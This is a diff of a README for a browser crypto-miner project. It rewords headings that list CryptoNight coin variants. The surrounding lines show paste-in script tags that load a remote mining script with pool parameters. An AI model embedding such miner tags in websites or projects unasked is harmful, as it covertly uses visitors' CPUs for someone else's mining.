@@ -15,11 +15,11 @@ Crypto Webminer | Electroneum | Monero | Bytecoin | IntenseCoin | Graft | Sumoko
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/1?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
-#### Examples: CN (ASIC) Coins (Electroneum, Bytecoin, Sumokoin, Dero, Xeonbit, Pennykoin, Beldex, Newton, Karbo, X12 Coin, B2Bcoin) need ?algo=cn/0<br> 
+#### Examples: CN ASIC Coins (Electroneum, Bytecoin, Sumokoin, Dero, Xeonbit, Pennykoin, Beldex, Newton, Karbo, X12 Coin, B2Bcoin) need ?algo=cn/0<br> 
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/0?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
-#### Examples: Stellite (CN-Half Coins | CN Stellite V5) (Stellite) need ?algo=cn/xtl<br> 
+#### Examples: Stellite (CN Stellite V5) (Stellite) need ?algo=cn/xtl<br> 
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/xtl?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
@@ -27,11 +27,11 @@ Crypto Webminer | Electroneum | Monero | Bytecoin | IntenseCoin | Graft | Sumoko
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn-lite/1?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
-#### Examples: Turtlecoin, NXstream (neweset Turtle V2 fork) need ?algo=cn-pico/trtl
+#### Examples: CN Pico (Turtlecoin, NXstream) need ?algo=cn-pico/trtl
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn-pico/trtl?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
-#### Examples: CN Fast V2 Coins (Masari) need ?algo=cn/half<br> 
+#### Examples: CN Fast V2 | CN Half Coins (Masari) need ?algo=cn/half<br> 
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/half?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
